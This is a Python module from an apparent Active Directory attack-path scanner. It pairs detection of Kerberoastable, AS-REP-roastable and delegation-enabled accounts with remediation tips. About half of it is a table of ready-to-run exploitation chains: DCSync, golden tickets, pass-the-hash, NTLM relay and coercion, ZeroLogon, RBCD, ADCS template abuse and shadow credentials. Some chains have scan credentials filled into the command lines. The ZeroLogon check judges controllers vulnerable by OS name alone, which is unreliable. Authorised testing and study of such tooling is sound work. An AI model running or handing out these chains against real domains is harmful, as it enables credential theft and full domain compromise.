"""
Attack Vector Analyzer Module

Searches for potential attack vectors in domain structure
"""

import copy
from typing import List, Dict, Optional
from ...proto import (
    DirectoryType, ScanOptions, AttackMethod, AttackSurface,
    User, Group, Computer, TrustRelationship, GPO, ExploitationCommands
)


# 🔴 AD — Impacket/Rubeus-style chains; export AD_* env vars or rely on {dc_ip}/{domain} from scan.
AD_EXPLOITATION_COMMANDS: Dict[str, Dict] = {
    "kerberoast": {
        "commands": [
            "$ impacket-GetUserSPNs '${AD_NETBIOS_DOMAIN}/${AD_USER}:${AD_PASSWORD}' -dc-ip {dc_ip} -request",
            "$ hashcat -m 13100 hashes.txt '${AD_HASHCAT_WORDLIST:-wordlist.txt}'",
            "$ Rubeus.exe kerberoast /outfile:hashes.txt"
        ],
        "description": "Kerberoasting (set AD_NETBIOS_DOMAIN, AD_USER, AD_PASSWORD; dc_ip from scan or AD_DC_IP)"
    },
    "asreproast": {
        "commands": [
            "$ impacket-GetNPUsers '${AD_DNS_DOMAIN}/' -usersfile '${AD_USER_LIST:-users.txt}' -dc-ip {dc_ip} -format hashcat",
            "$ hashcat -m 18200 hashes.txt '${AD_HASHCAT_WORDLIST:-wordlist.txt}'",
            "$ Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"
        ],
        "description": "AS-REP roast (users without pre-auth; AD_DNS_DOMAIN e.g. corp.example.com)"
    },
    "dcsync": {
        "commands": [
            "$ impacket-secretsdump '${AD_DNS_DOMAIN}/${AD_USER}:${AD_PASSWORD}@{dc_ip}' -just-dc-ntlm",
            "$ mimikatz.exe \"lsadump::dcsync /domain:{domain} /user:Administrator\"",
            "$ impacket-secretsdump '${AD_DNS_DOMAIN}/${AD_USER}@{dc_ip}' -hashes ':${AD_NTLM_HASH}' -just-dc-ntlm"
        ],
        "description": "DCSync / secretsdump against {dc_ip} ({domain} = DNS name for mimikatz)"
    },
    "golden_ticket": {
        "commands": [
            "$ impacket-ticketer -nthash '${KRBTGT_NTLM}' -domain-sid '${DOMAIN_SID}' -domain '${AD_DNS_DOMAIN}' Administrator",
            "$ export KRB5CCNAME=/tmp/administrator.ccache",
            "$ impacket-psexec -k -no-pass '${AD_DNS_DOMAIN}/Administrator@{dc_ip}'"
        ],
        "description": "Golden ticket material (KRBTGT_NTLM + DOMAIN_SID from DCSync; lab-only)"
    },
    "pass_the_hash": {
        "commands": [
            "$ impacket-psexec '${AD_NETBIOS_DOMAIN}/${AD_USER}@${AD_TARGET_HOST}' -hashes ':${AD_NTLM_HASH}'",
            "$ crackmapexec smb '${AD_TARGET_HOST}' -u '${AD_USER}' -H '${AD_NTLM_HASH}'",
            "$ impacket-wmiexec '${AD_NETBIOS_DOMAIN}/${AD_USER}@${AD_TARGET_HOST}' -hashes ':${AD_NTLM_HASH}'"
        ],
        "description": "Pass-the-Hash to AD_TARGET_HOST (name or IP)"
    },
    "ntlm_relay": {
        "commands": [
            "$ impacket-ntlmrelayx -t 'ldaps://{dc_ip}' --escalate-user '${AD_ESCALATE_USER:-DelegateUser}'",
            "$ responder -I '${AD_RESPONDER_IFACE:-eth0}' -wrf",
            "$ mitm6 -d {domain}"
        ],
        "description": "NTLM relay toward DC / AD CS HTTP (set iface; domain = DNS suffix)"
    },
    "zerologon": {
        "commands": [
            "$ zerologon_tester.py '${PDC_NETBIOS_NAME}' {dc_ip}",
            "$ impacket-secretsdump -no-pass -just-dc '${AD_DNS_DOMAIN}/${PDC_NETBIOS_NAME}$@{dc_ip}'",
            "$ python3 cve-2020-1472-exploit.py '${PDC_NETBIOS_NAME}' {dc_ip}"
        ],
        "description": "CVE-2020-1472 (PDC_NETBIOS_NAME = NetBIOS machine name of DC)"
    },
    "petitpotam": {
        "commands": [
            "$ PetitPotam.py '${LISTENER_IP}' {dc_ip}",
            "$ impacket-ntlmrelayx -t 'http://${AD_CS_HOST}/certsrv/certfnsh.asp' -smb2support --adcs",
            "$ python3 PetitPotam.py -u '${AD_USER}' -p '${AD_PASSWORD}' '${LISTENER_IP}' {dc_ip}"
        ],
        "description": "PetitPotam coercion (LISTENER_IP = relay host; AD_CS_HOST = CA web enrollment)"
    },
    "rbcd": {
        "commands": [
            "$ rbcd.py -action write -delegate-to '${DELEGATE_TO}\\$' -delegate-from '${DELEGATE_FROM}\\$' '${AD_DNS_DOMAIN}/${AD_USER}:${AD_PASSWORD}'",
            "$ impacket-getST -spn 'cifs/${AD_TARGET_HOST}' -impersonate Administrator '${AD_DNS_DOMAIN}/${DELEGATE_FROM}\\$' -hashes ':${AD_MACHINE_HASH}'",
            "$ export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass '${AD_DNS_DOMAIN}/Administrator@${AD_TARGET_HOST}'"
        ],
        "description": "RBCD chain (DELEGATE_TO / DELEGATE_FROM machine accounts; AD_MACHINE_HASH for from-computer)"
    },
    "adcs_esc1": {
        "commands": [
            "$ certipy find -u '${AD_USER}@{domain}' -p '${AD_PASSWORD}' -dc-ip {dc_ip} -vulnerable",
            "$ certipy req -u '${AD_USER}@{domain}' -p '${AD_PASSWORD}' -target '${AD_CS_HOST}' -template '${AD_VULN_TEMPLATE}' -ca '${AD_CA_NAME}'",
            "$ certipy auth -pfx '${AD_STOLEN_PFX:-admin.pfx}' -dc-ip {dc_ip}"
        ],
        "description": "ADCS ESC1-style template abuse (certipy; set AD_CA_NAME / AD_VULN_TEMPLATE)"
    },
    "shadow_credentials": {
        "commands": [
            "$ certipy shadow auto -u '${AD_USER}@{domain}' -p '${AD_PASSWORD}' -account '${SHADOW_TARGET_SAM}' -dc-ip {dc_ip}",
            "$ certipy auth -pfx '${SHADOW_TARGET_SAM}.pfx' -dc-ip {dc_ip}",
            "$ impacket-getTGT '${AD_DNS_DOMAIN}/${SHADOW_TARGET_SAM}' -hashes ':${AD_NTLM_HASH}'"
        ],
        "description": "Shadow Credentials (KeyCredentialLink) against SHADOW_TARGET_SAM"
    },
    "default": {
        "commands": [
            "$ ldapsearch -x -H ldap://{dc_ip} -D '${AD_BIND_DN}' -w '${AD_BIND_PASSWORD}' -b '${AD_SEARCH_BASE}'",
            "$ bloodhound-python -d {domain} -u '${AD_USER}' -p '${AD_PASSWORD}' -c All -dc {dc_ip}",
            "$ crackmapexec smb {dc_ip} -u '${AD_USER}' -p '${AD_PASSWORD}' --shares"
        ],
        "description": "LDAP / BloodHound / SMB enumeration (set AD_BIND_DN, AD_SEARCH_BASE)"
    }
}

# Proto AttackMethod.KERBEROAST value is misspelled as "kerberohowt"; map to template key "kerberoast".
_AD_METHOD_TEMPLATE_SOURCE = {
    "kerberohowt": "kerberoast",
    "bloodhound": "default",
    "credential_dump": "dcsync",
    "silver_ticket": "golden_ticket",
    "unconstrained_delegation": "rbcd",
    "ldapsweep": "default",
    "acl_abuse": "default",
    "printerbug": "ntlm_relay",
    "dfspipe": "ntlm_relay",
    "shadowcoerce": "ntlm_relay",
    "coercer": "ntlm_relay",
    "adcs_esc2": "adcs_esc1",
    "adcs_esc3": "adcs_esc1",
    "adcs_esc4": "adcs_esc1",
    "adcs_esc5": "adcs_esc1",
    "adcs_esc6": "adcs_esc1",
    "adcs_esc7": "adcs_esc1",
    "adcs_esc8": "adcs_esc1",
    "adcs_esc9": "adcs_esc1",
    "adcs_esc10": "adcs_esc1",
    "adcs_esc11": "adcs_esc1",
    "certifried": "adcs_esc1",
    "constrained_delegation": "rbcd",
    "samaccountname_spoofing": "default",
}


def _expand_ad_exploitation_commands() -> None:
    for member in AttackMethod:
        key = member.value
        if key in AD_EXPLOITATION_COMMANDS:
            continue
        src = _AD_METHOD_TEMPLATE_SOURCE.get(key, "default")
        if src not in AD_EXPLOITATION_COMMANDS:
            src = "default"
        AD_EXPLOITATION_COMMANDS[key] = copy.deepcopy(AD_EXPLOITATION_COMMANDS[src])


_expand_ad_exploitation_commands()


def build_exploitation_commands(method: AttackMethod, dc_ip: str = None, domain: str = None) -> ExploitationCommands:
    """Build exploitation commands for an attack method."""
    method_str = method.value if hasattr(method, 'value') else str(method)
    cmd_template = AD_EXPLOITATION_COMMANDS.get(method_str, AD_EXPLOITATION_COMMANDS["default"])

    dc = (dc_ip or "").strip() or "${AD_DC_IP}"
    dns_domain = (domain or "").strip() or "${AD_DNS_DOMAIN}"

    commands = []
    for cmd in cmd_template.get("commands", []):
        cmd_replaced = (
            cmd.replace("{dc_ip}", dc)
            .replace("{domain}", dns_domain)
        )
        commands.append(cmd_replaced)

    return ExploitationCommands(
        server=dns_domain,
        ip=dc,
        commands=commands,
        description=cmd_template.get("description", f"AD attack via {method_str}")
    )


class AttackVectorAnalyzer:
    """Analyzes domain structure for potential attack vectors"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    def analyze(self, scan_options: ScanOptions, directory_type: DirectoryType,
                users: List[User], groups: List[Group], computers: List[Computer],
                trusts: List[TrustRelationship], gpos: List[GPO]) -> List[AttackSurface]:
        """
        Searches for potential attack vectors in domain structure
        
        Args:
            scan_options: Scan parameters
            directory_type: Directory type
            users: User list
            groups: Group list
            computers: Computer list
            trusts: Trust relationship list
            gpos: Group Policy Object list
            
        Returns:
            List[AttackSurface]: List of potential attack vectors
        """
        attack_vectors = []
        
        attack_methods = scan_options.attack_methods or list(AttackMethod)
        
        for method in attack_methods:
            try:
                if method == AttackMethod.KERBEROAST:
                    kerberoast_candidates = [user for user in users if user.kerberoast_candidate]
                    
                    if kerberoast_candidates:
                        details = {
                            "description": "Detected account entries with SPN, which can be vulnerable to Kerberoasting attack",
                            "command": f"GetUserSPNs.py {scan_options.domain_name}/{scan_options.username}:{scan_options.password} -dc-ip {scan_options.ldap_server} -request"
                        }
                        
                        attack = AttackSurface(
                            method=AttackMethod.KERBEROAST,
                            status="exploitable",
                            details=details,
                            affected_objects=[user.distinguished_name for user in kerberoast_candidates],
                            recommendations=[
                                "Use complex passwords (at least 25 characters) for service accounts",
                                "Configure GMSA (Group Managed Service Accounts) instead of regular service accounts",
                                "Implement monitoring of service ticket request attempts using Event ID 4769"
                            ],
                            # 🔴 Add explicit commands
                            commands=build_exploitation_commands(method, scan_options.ldap_server, scan_options.domain_name)
                        )
                        
                        attack_vectors.append(attack)
                    else:
                        attack = AttackSurface(
                            method=AttackMethod.KERBEROAST,
                            status="not_exploitable",
                            details={"description": "No account entries detected, vulnerable to Kerberoasting attack"},
                            affected_objects=[],
                            recommendations=[]
                        )
                        
                        attack_vectors.append(attack)
                
                elif method == AttackMethod.ASREPROAST:
                    asreproast_candidates = [user for user in users if user.asreproast_candidate]
                    
                    if asreproast_candidates:
                        details = {
                            "description": "Detected account entries with disabled Kerberos pre-authentication",
                            "command": f"GetNPUsers.py {scan_options.domain_name}/{scan_options.username}:{scan_options.password} -dc-ip {scan_options.ldap_server} -request -format hashcat"
                        }
                        
                        attack = AttackSurface(
                            method=AttackMethod.ASREPROAST,
                            status="exploitable",
                            details=details,
                            affected_objects=[user.distinguished_name for user in asreproast_candidates],
                            recommendations=[
                                "Enable Kerberos pre-authentication for all accounts",
                                "Use complex passwords for all accounts"
                            ],
                            # 🔴 Add explicit commands
                            commands=build_exploitation_commands(method, scan_options.ldap_server, scan_options.domain_name)
                        )
                        
                        attack_vectors.append(attack)
                    else:
                        attack = AttackSurface(
                            method=AttackMethod.ASREPROAST,
                            status="not_exploitable",
                            details={"description": "No account entries detected with disabled Kerberos pre-authentication"},
                            affected_objects=[],
                            recommendations=[]
                        )
                        
                        attack_vectors.append(attack)
                
                elif method == AttackMethod.UNCONSTRAINED_DELEGATION:
                    delegation_candidates = [computer for computer in computers if computer.delegation_permitted and not computer.delegation_services]
                    
                    if delegation_candidates:
                        details = {
                            "description": "Detected computers with unconstrained delegation",
                            "command": "ldapsearch ... (userAccountControl:1.2.840.113556.1.4.803:=524288) ..."
                        }
                        
                        attack = AttackSurface(
                            method=AttackMethod.UNCONSTRAINED_DELEGATION,
                            status="exploitable",
                            details=details,
                            affected_objects=[computer.distinguished_name for computer in delegation_candidates],
                            recommendations=[
                                "Use constrained delegation instead of unconstrained",
                                "Protect account entries with flag 'protected from delegation'"
                            ]
                        )
                        
                        attack_vectors.append(attack)
                    else:
                        attack = AttackSurface(
                            method=AttackMethod.UNCONSTRAINED_DELEGATION,
                            status="not_exploitable",
                            details={"description": "Not detected computers with unconstrained delegation"},
                            affected_objects=[],
                            recommendations=[]
                        )
                        
                        attack_vectors.append(attack)
                
                elif method == AttackMethod.DCSync:
                    if scan_options.username and (scan_options.password or scan_options.ntlm_hash):
                        if directory_type == DirectoryType.ACTIVE_DIRECTORY:
                            ldap_server = scan_options.ldap_server or (scan_options.domain_controllers[0] if scan_options.domain_controllers else None)
                            
                            if ldap_server:
                                try:
                                    user_dn = None
                                    for user in users:
                                        if user.sam_account_name.lower() == scan_options.username.lower() or user.username.lower() == scan_options.username.lower():
                                            user_dn = user.distinguished_name
                                            break
                                    
                                    if user_dn:
                                        admin_groups = ["Domain Admins", "Enterprise Admins", "Administrators"]
                                        
                                        is_admin = False
                                        for user in users:
                                            if user.distinguished_name == user_dn:
                                                for group_dn in user.groups:
                                                    for group in groups:
                                                        if group.distinguished_name == group_dn:
                                                            if any(admin_group.lower() in group.name.lower() for admin_group in admin_groups):
                                                                is_admin = True
                                                                break
                                                    if is_admin:
                                                        break
                                                break
                                        
                                        if is_admin:
                                            details = {
                                                "description": "Current user has permissions on execution DCSync attack",
                                                "command": f"secretsdump.py -just-dc {scan_options.domain_name}/{scan_options.username}:{scan_options.password}@{ldap_server}"
                                            }
                                            
                                            attack = AttackSurface(
                                                method=AttackMethod.DCSync,
                                                status="exploitable",
                                                details=details,
                                                affected_objects=[user_dn],
                                                recommendations=[
                                                    "Restrict permissions on directory replication",
                                                    "Monitor security events related to directory replication"
                                                ]
                                            )
                                            
                                            attack_vectors.append(attack)
                                        else:
                                            attack = AttackSurface(
                                                method=AttackMethod.DCSync,
                                                status="potentially_exploitable",
                                                details={"description": "for checking DCSync possibilities ACL analysis of domain is required"},
                                                affected_objects=[],
                                                recommendations=[
                                                    "Check extended permissions for directory replication",
                                                    "Install BloodHound for analyzing attack paths and user rights"
                                                ]
                                            )
                                            
                                            attack_vectors.append(attack)
                                except Exception as e:
                                    attack = AttackSurface(
                                        method=AttackMethod.DCSync,
                                        status="error",
                                        details={"description": f"Error while checking possibilities DCSync: {str(e)}"},
                                        affected_objects=[],
                                        recommendations=[]
                                    )
                                    
                                    attack_vectors.append(attack)
                
                elif method == AttackMethod.ZEROLOGON:
                    if directory_type == DirectoryType.ACTIVE_DIRECTORY:
                        vulnerable_dcs = []
                        
                        for computer in computers:
                            if computer.is_domain_controller:
                                if computer.os and computer.os_version:
                                    if "2019" in computer.os or "2016" in computer.os or "2012" in computer.os or "2008" in computer.os:
                                        vulnerable_dcs.append(computer)
                        
                        if vulnerable_dcs:
                            details = {
                                "description": "detected domain controllers, potentially vulnerable to ZeroLogon attack (CVE-2020-1472). for accurate determination of vulnerabilities additional check is required.",
                                "command": "zerologon_tester.py <DC_NAME> <DC_IP>"
                            }
                            
                            attack = AttackSurface(
                                method=AttackMethod.ZEROLOGON,
                                status="potentially_exploitable",
                                details=details,
                                affected_objects=[computer.distinguished_name for computer in vulnerable_dcs],
                                recommendations=[
                                    "Install latest security updates on domain controllers",
                                    "Enable monitoring of security events related to Netlogon authentication",
                                    "Check for presence of updates KB4571729, KB4571736, KB4571702, KB4571703, KB4571723"
                                ]
                            )
                            
                            attack_vectors.append(attack)
                        else:
                            attack = AttackSurface(
                                method=AttackMethod.ZEROLOGON,
                                status="not_exploitable",
                                details={"description": "No domain controllers detected vulnerable to ZeroLogon attack (CVE-2020-1472)"},
                                affected_objects=[],
                                recommendations=[]
                            )
                            
                            attack_vectors.append(attack)
                
            except Exception as e:
                attack = AttackSurface(
                    method=method,
                    status="error",
                    details={"description": f"Error during analysis: {str(e)}"},
                    affected_objects=[],
                    recommendations=[]
                )
                
                attack_vectors.append(attack)
        
        return attack_vectors

